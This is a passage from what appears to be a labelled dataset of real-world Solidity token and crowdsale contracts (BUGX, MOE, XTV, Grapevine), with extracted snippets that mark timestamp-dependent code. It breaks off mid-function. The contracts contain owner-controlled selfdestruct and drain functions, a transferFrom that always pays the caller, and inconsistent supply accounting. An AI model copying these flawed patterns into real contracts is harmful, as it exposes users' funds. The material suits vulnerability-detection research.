{\n string public constant name = \"BUGX2.0\";\n string public constant symbol = \"BUGX\";\n uint256 public constant decimals = 18;\n string public version = \"2.0\";\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenIssued = 0;\n uint256 public tokenMigrated = 0;\n uint256 internal tokenExchangeRate = 9000;\n uint256 internal tokenExchangeRateTwo = 9900;\n uint256 internal tokenExchangeRateThree = 11250;\n event AllocateToken(address indexed _to, uint256 _value);\n event TakebackToken(address indexed _from, uint256 _value);\n event RaiseToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _addr, uint256 _tokens, uint256 _totaltokens);\n function formatDecimals(uint256 _value) internal pure returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n constructor(\n address _ethFundDeposit,\n uint256 _currentSupply\n )\n public\n {\n require(_ethFundDeposit != address(0x0));\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(1500000000);\n require(currentSupply <= totalSupply);\n balances[ethFundDeposit] = currentSupply;\n totalbalances[ethFundDeposit] = currentSupply;\n }\n function increaseSupply (uint256 _tokens) onlyOwner external {\n uint256 _value = formatDecimals(_tokens);\n require (_value + currentSupply <= totalSupply);\n currentSupply = safeAdd(currentSupply, _value);\n tokenadd(ethFundDeposit,_value);\n emit IncreaseSupply(_value);\n }\n function decreaseSupply (uint256 _tokens) onlyOwner external {\n uint256 _value = formatDecimals(_tokens);\n uint256 tokenCirculation = safeAdd(tokenRaised,tokenIssued);\n require (safeAdd(_value,tokenCirculation) <= currentSupply);\n currentSupply = safeSubtract(currentSupply, _value);\n tokensub(ethFundDeposit,_value);\n emit DecreaseSupply(_value);\n }\n modifier whenFunding() {\n require (isFunding);\n require (block.number >= fundingStartBlock);\n require (block.number <= fundingStopBlock);\n _;\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) onlyOwner external {\n require (!isFunding);\n require (_fundingStartBlock < _fundingStopBlock);\n require (block.number < _fundingStartBlock);\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() onlyOwner external {\n require (isFunding);\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) onlyOwner external {\n require (_newContractAddr != newContractAddr);\n newContractAddr = _newContractAddr;\n }\n function migrate(address _addr) onlySelfOrOwner(_addr) external {\n require(!isFunding);\n require(newContractAddr != address(0x0));\n uint256 tokens_value = balances[_addr];\n uint256 totaltokens_value = totalbalances[_addr];\n require (tokens_value != 0 || totaltokens_value != 0);\n balances[_addr] = 0;\n totalbalances[_addr] = 0;\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n require (newContract.migrate(_addr, tokens_value, totaltokens_value));\n tokenMigrated = safeAdd(tokenMigrated, totaltokens_value);\n emit Migrate(_addr, tokens_value, totaltokens_value);\n }\n function tokenRaise (address _addr,uint256 _value) internal {\n uint256 tokenCirculation = safeAdd(tokenRaised,tokenIssued);\n require (safeAdd(_value,tokenCirculation) <= currentSupply);\n tokenRaised = safeAdd(tokenRaised, _value);\n emit RaiseToken(_addr, _value);\n }\n function tokenIssue (address _addr,uint256 _value) internal {\n uint256 tokenCirculation = safeAdd(tokenRaised,tokenIssued);\n require (safeAdd(_value,tokenCirculation) <= currentSupply);\n tokenIssued = safeAdd(tokenIssued, _value);\n emit IssueToken(_addr, _value);\n }\n function tokenTakeback (address _addr,uint256 _value) internal {\n require (tokenIssued >= _value);\n tokenIssued = safeSubtract(tokenIssued, _value);\n emit TakebackToken(_addr, _value);\n }\n function tokenadd (address _addr,uint256 _value) internal {\n require(_value != 0);\n require (_addr != address(0x0));\n balances[_addr] = safeAdd(balances[_addr], _value);\n totalbalances[_addr] = safeAdd(totalbalances[_addr], _value);\n }\n function tokensub (address _addr,uint256 _value) internal {\n require(_value != 0);\n require (_addr != address(0x0));\n balances[_addr] = safeSubtract(balances[_addr], _value);\n totalbalances[_addr] = safeSubtract(totalbalances[_addr], _value);\n }\n function allocateToken(address _addr, uint256 _tokens) onlyOwner external {\n uint256 _value = formatDecimals(_tokens);\n tokenadd(_addr,_value);\n tokensub(ethFundDeposit,_value);\n tokenIssue(_addr,_value);\n emit Transfer(ethFundDeposit, _addr, _value);\n }\n function deductionToken (address _addr, uint256 _tokens) onlyOwner external {\n uint256 _value = formatDecimals(_tokens);\n tokensub(_addr,_value);\n tokenadd(ethFundDeposit,_value);\n tokenTakeback(_addr,_value);\n emit Transfer(_addr, ethFundDeposit, _value);\n }\n function addSegmentation(address _addr, uint256 _times,uint256 _period,uint256 _tokens) onlyOwner external returns (bool) {\n uint256 amount = userbalancesSegmentation[_addr][_times][_period];\n if (amount != 0 && _tokens != 0){\n uint256 _value = formatDecimals(_tokens);\n userbalancesSegmentation[_addr][_times][_period] = safeAdd(amount,_value);\n userbalances[_addr][_times] = safeAdd(userbalances[_addr][_times], _value);\n totalbalances[_addr] = safeAdd(totalbalances[_addr], _value);\n tokensub(ethFundDeposit,_value);\n tokenIssue(_addr,_value);\n return true;\n } else {\n return false;\n }\n }\n function subSegmentation(address _addr, uint256 _times,uint256 _period,uint256 _tokens) onlyOwner external returns (bool) {\n uint256 amount = userbalancesSegmentation[_addr][_times][_period];\n if (amount != 0 && _tokens != 0){\n uint256 _value = formatDecimals(_tokens);\n userbalancesSegmentation[_addr][_times][_period] = safeSubtract(amount,_value);\n userbalances[_addr][_times] = safeSubtract(userbalances[_addr][_times], _value);\n totalbalances[_addr] = safeSubtract(totalbalances[_addr], _value);\n tokenadd(ethFundDeposit,_value);\n tokenTakeback(_addr,_value);\n return true;\n } else {\n return false;\n }\n }\n function setTokenExchangeRate(uint256 _RateOne,uint256 _RateTwo,uint256 _RateThree) onlyOwner external {\n require (_RateOne != 0 && _RateTwo != 0 && _RateThree != 0);\n require (_RateOne != tokenExchangeRate && _RateTwo != tokenExchangeRateTwo && _RateThree != tokenExchangeRateThree);\n tokenExchangeRate = _RateOne;\n tokenExchangeRateTwo = _RateTwo;\n tokenExchangeRateThree = _RateThree;\n }\n function computeTokenAmount(uint256 _eth) internal view returns (uint256 tokens) {\n if(_eth > 0 && _eth < 100 ether){\n tokens = safeMult(_eth, tokenExchangeRate);\n }\n if (_eth >= 100 ether && _eth < 500 ether){\n tokens = safeMult(_eth, tokenExchangeRateTwo);\n }\n if (_eth >= 500 ether ){\n tokens = safeMult(_eth, tokenExchangeRateThree);\n }\n }\n function LockMechanismByOwner (\n address _addr,\n uint256 _tokens\n )\n external onlyOwner whenFunding\n {\n require (_tokens != 0);\n uint256 _value = formatDecimals(_tokens);\n tokenRaise(_addr,_value);\n tokensub(ethFundDeposit,_value);\n LockMechanism(_addr,_value);\n emit Transfer(ethFundDeposit,_addr,_value);\n }\n function transferETH() onlyOwner external {\n require (address(this).balance != 0);\n ethFundDeposit.transfer(address(this).balance);\n }\n function () public payable whenFunding {\n require (msg.value != 0);\n uint256 _value = computeTokenAmount(msg.value);\n tokenRaise(msg.sender,_value);\n tokensub(ethFundDeposit,_value);\n LockMechanism(msg.sender,_value);\n emit Transfer(ethFundDeposit,msg.sender,_value);\n }\n}",
  "extract_feature": [
    "function ShowTime() internal view returns (uint256) {\nreturn block.timestamp;\n}",
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) onlyOwner external {\nrequire (!isFunding);\nrequire (_fundingStartBlock < _fundingStopBlock);\nrequire (block.number < _fundingStartBlock);\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f26"
  },
  "filename": "6833.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract MOEToken is ERC20 {\n using SafeMath for uint256;\n address public owner;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n string public name = \"MOE's game art foundation\";\n string public constant symbol = \"MOE\";\n uint public constant decimals = 18;\n bool public stopped;\n modifier stoppable {\n assert(!stopped);\n _;\n }\n uint256 public totalSupply = 1000000000*(10**18);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event LOCK(address indexed _owner, uint256 _value);\n mapping (address => uint256) public lockAddress;\n modifier lock(address _add){\n require(_add != address(0));\n uint256 releaseTime = lockAddress[_add];\n if(releaseTime > 0){\n require(block.timestamp >= releaseTime);\n _;\n }else{\n _;\n }\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function MOEToken() public {\n owner = msg.sender;\n balances[msg.sender] = totalSupply;\n }\n function stop() onlyOwner public {\n stopped = true;\n }\n function start() onlyOwner public {\n stopped = false;\n }\n function lockTime(address _to,uint256 _value) onlyOwner public {\n if(_value > block.timestamp){\n lockAddress[_to] = _value;\n emit LOCK(_to, _value);\n }\n }\n function lockOf(address _owner) constant public returns (uint256) {\n return lockAddress[_owner];\n }\n function transferOwnership(address _newOwner) onlyOwner public {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function () public payable {\n address myAddress = this;\n emit Transfer(msg.sender, myAddress, msg.value);\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _amount) stoppable lock(msg.sender) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, uint256 _amount) stoppable lock(_from) public returns (bool success) {\n require(_amount <= balances[_from]);\n require(_amount <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n balances[msg.sender] = balances[msg.sender].add(_amount);\n emit Transfer(_from, msg.sender, _amount);\n return true;\n }\n function approve(address _spender, uint256 _value) stoppable lock(_spender) public returns (bool success) {\n if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256) {\n return allowed[_owner][_spender];\n }\n function withdraw() onlyOwner public {\n address myAddress = this;\n uint256 etherBalance = myAddress.balance;\n owner.transfer(etherBalance);\n }\n function kill() onlyOwner public {\n selfdestruct(msg.sender);\n }\n function setName(string _name) onlyOwner public {\n name = _name;\n }\n}",
  "extract_feature": [
    "function lockTime(address _to,uint256 _value) onlyOwner public {\nif(_value > block.timestamp){\nlockAddress[_to] = _value;\nemit LOCK(_to, _value);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f27"
  },
  "filename": "6844.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n function kill() public onlyOwner {\n selfdestruct(owner);\n }\n}\nlibrary XTVNetworkUtils {\n function verifyXTVSignatureAddress(bytes32 hash, bytes memory sig) internal pure returns (address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65) {\n return (address(0));\n }\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27) {\n v += 27;\n }\n if (v != 27 && v != 28) {\n return (address(0));\n }\n bytes32 prefixedHash = keccak256(\n abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n );\n return ecrecover(prefixedHash, v, r, s);\n }\n}\ncontract XTVNetworkGuard {\n mapping(address => bool) xtvNetworkEndorser;\n modifier validateSignature(\n string memory message,\n bytes32 verificationHash,\n bytes memory xtvSignature\n ) {\n bytes32 xtvVerificationHash = keccak256(abi.encodePacked(verificationHash, message));\n require(verifyXTVSignature(xtvVerificationHash, xtvSignature));\n _;\n }\n function setXTVNetworkEndorser(address _addr, bool isEndorser) public;\n function verifyXTVSignature(bytes32 hash, bytes memory sig) public view returns (bool) {\n address signerAddress = XTVNetworkUtils.verifyXTVSignatureAddress(hash, sig);\n return xtvNetworkEndorser[signerAddress];\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20 {\n bool public paused = false;\n bool public mintingFinished = false;\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) internal allowed;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n function allowance(address _owner, address spender) public view returns (uint256);\n function increaseApproval(address spender, uint addedValue) public returns (bool);\n function decreaseApproval(address spender, uint subtractedValue) public returns (bool);\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Buy(address indexed _recipient, uint _amount);\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n event Pause();\n event Unpause();\n}\ncontract ERC20Token is ERC20, Ownable {\n using SafeMath for uint256;\n function totalSupply() public view returns (uint256) { return totalSupply_; }\n function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; }\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool) {\n allowed[msg.sender][_spender] = (allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract XTVToken is XTVNetworkGuard, ERC20Token {\n using SafeMath for uint256;\n string public name = \"XTV Network\";\n string public symbol = \"XTV\";\n uint public decimals = 18;\n address public fullfillTeamAddress;\n address public fullfillFounder;\n address public fullfillAdvisors;\n address public XTVNetworkContractAddress;\n bool public airdropActive;\n uint public startTime;\n uint public endTime;\n uint public XTVAirDropped;\n uint public XTVBurned;\n mapping(address => bool) public claimed;\n uint256 public constant INITIAL_SUPPLY = 500000000;\n uint256 public constant EXPECTED_TOTAL_SUPPLY = 1000000000;\n uint256 private constant TOKEN_MULTIPLIER = 1000000;\n uint256 public constant ALLOC_TEAM = 330 * TOKEN_MULTIPLIER;\n uint256 public constant ALLOC_ADVISORS = 70 * TOKEN_MULTIPLIER;\n uint256 public constant ALLOC_FOUNDER = 100 * TOKEN_MULTIPLIER;\n uint256 public constant ALLOC_AIRDROP = 500 * TOKEN_MULTIPLIER;\n uint256 public constant AIRDROP_CLAIM_AMMOUNT = 500;\n modifier isAirdropActive() {\n require(airdropActive);\n _;\n }\n modifier canClaimTokens() {\n uint256 remainingSupply = balances[address(0)];\n require(!claimed[msg.sender] && remainingSupply > AIRDROP_CLAIM_AMMOUNT);\n _;\n }\n event LogAirdropClaim(\n address addr,\n string token,\n bytes32 verificationHash,\n bytes xtvSignature\n );\n constructor(\n address _fullfillTeam,\n address _fullfillFounder,\n address _fullfillAdvisors\n ) public {\n owner = msg.sender;\n fullfillTeamAddress = _fullfillTeam;\n fullfillFounder = _fullfillFounder;\n fullfillAdvisors = _fullfillAdvisors;\n airdropActive = true;\n startTime = block.timestamp;\n endTime = startTime + 365 days;\n balances[_fullfillTeam] = ALLOC_TEAM;\n balances[_fullfillFounder] = ALLOC_FOUNDER;\n balances[_fullfillAdvisors] = ALLOC_ADVISORS;\n balances[address(0)] = ALLOC_AIRDROP;\n totalSupply_ = INITIAL_SUPPLY;\n }\n function setXTVNetworkEndorser(address _addr, bool isEndorser) public onlyOwner {\n xtvNetworkEndorser[_addr] = isEndorser;\n }\n function claim(\n string memory token,\n bytes32 verificationHash,\n bytes memory xtvSignature\n )\n public\n isAirdropActive\n canClaimTokens\n validateSignature(token, verificationHash, xtvSignature)\n returns (uint256)\n {\n claimed[msg.sender] = true;\n balances[address(0)] = balances[address(0)].sub(AIRDROP_CLAIM_AMMOUNT);\n balances[msg.sender] = balances[msg.sender].add(AIRDROP_CLAIM_AMMOUNT);\n XTVAirDropped = XTVAirDropped.add(AIRDROP_CLAIM_AMMOUNT);\n totalSupply_ = totalSupply_.add(AIRDROP_CLAIM_AMMOUNT);\n emit LogAirdropClaim(msg.sender, token, verificationHash, xtvSignature);\n return balances[msg.sender];\n }\n function burnTokens() public {\n if (block.timestamp > endTime) {\n uint256 remaining = balances[address(0)];\n airdropActive = false;\n XTVBurned = remaining;\n }\n }\n function setXTVNetworkContractAddress(address addr) public onlyOwner {\n XTVNetworkContractAddress = addr;\n }\n function setXTVTokenAirdropStatus(bool _status) public onlyOwner {\n airdropActive = _status;\n }\n function drain() public onlyOwner {\n owner.transfer(address(this).balance);\n }\n}",
  "extract_feature": [
    "function burnTokens() public {\nif (block.timestamp > endTime) {\nuint256 remaining = balances[address(0)];\nairdropActive = false;\nXTVBurned = remaining;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f28"
  },
  "filename": "6915.sol",
  "content": "pragma solidity ^0.4.23;\ncontract BurnableTokenInterface {\n function burn(uint256 _value) public;\n}\ncontract GrapevineWhitelistInterface {\n function whitelist(address _address) view external returns (bool);\n function handleOffchainWhitelisted(address _addr, bytes _sig) external returns (bool);\n}\ncontract TokenTimelockControllerInterface {\n function activate() external;\n function createInvestorTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external returns (bool);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n constructor(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _deliverTokens(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _getTokenAmount(uint256 _weiAmount)\n internal view returns (uint256)\n {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n constructor(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n onlyWhileOpen\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract PostDeliveryCrowdsale is TimedCrowdsale {\n using SafeMath for uint256;\n mapping(address => uint256) public balances;\n function withdrawTokens() public {\n require(hasClosed());\n uint256 amount = balances[msg.sender];\n require(amount > 0);\n balances[msg.sender] = 0;\n _deliverTokens(msg.sender, amount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n constructor(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n emit Closed();\n wallet.transfer(address(this).balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n emit RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n emit Refunded(investor, depositedValue);\n }\n}\ncontract RefundableCrowdsale is FinalizableCrowdsale {\n using SafeMath for uint256;\n uint256 public goal;\n RefundVault public vault;\n constructor(uint256 _goal) public {\n require(_goal > 0);\n vault = new RefundVault(wallet);\n goal = _goal;\n }\n function claimRefund() public {\n require(isFinalized);\n require(!goalReached());\n vault.refund(msg.sender);\n }\n function goalReached() public view returns (bool) {\n return weiRaised >= goal;\n }\n function finalization() internal {\n if (goalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n super.finalization();\n }\n function _forwardFunds() internal {\n vault.deposit.value(msg.value)(msg.sender);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract GrapevineCrowdsale is CappedCrowdsale, TimedCrowdsale, Pausable, RefundableCrowdsale, PostDeliveryCrowdsale {\n using SafeMath for uint256;\n TokenTimelockControllerInterface public timelockController;\n GrapevineWhitelistInterface public authorisedInvestors;\n GrapevineWhitelistInterface public earlyInvestors;\n mapping(address => uint256) public bonuses;\n uint256 deliveryTime;\n uint256 tokensToBeDelivered;\n constructor(\n TokenTimelockControllerInterface _timelockController,\n GrapevineWhitelistInterface _authorisedInvestors,\n GrapevineWhitelistInterface _earlyInvestors,\n uint256 _rate,\n address _wallet,\n ERC20 _token,\n uint256 _openingTime,\n uint256 _closingTime,\n uint256 _softCap,\n uint256 _hardCap)\n Crowdsale(_rate, _wallet, _token)\n CappedCrowdsale(_hardCap)\n TimedCrowdsale(_openingTime, _closingTime)\n RefundableCrowdsale(_softCap)\n public\n {\n timelockController = _timelockController;\n authorisedInvestors = _authorisedInvestors;\n earlyInvestors = _earlyInvestors;\n deliveryTime = _closingTime.add(60*60*24*5);\n }\n function buyTokens(address _beneficiary, bytes _whitelistSign) public payable {\n if (!earlyInvestors.handleOffchainWhitelisted(_beneficiary, _whitelistSign)) {\n authorisedInvestors.handleOffchainWhitelisted(_beneficiary, _whitelistSign);\n }\n super.buyTokens(_beneficiary);\n }\n function withdrawTokens() public {\n require(goalReached());\n require(block.timestamp > deliveryTime);\n super.withdrawTokens();\n uint256 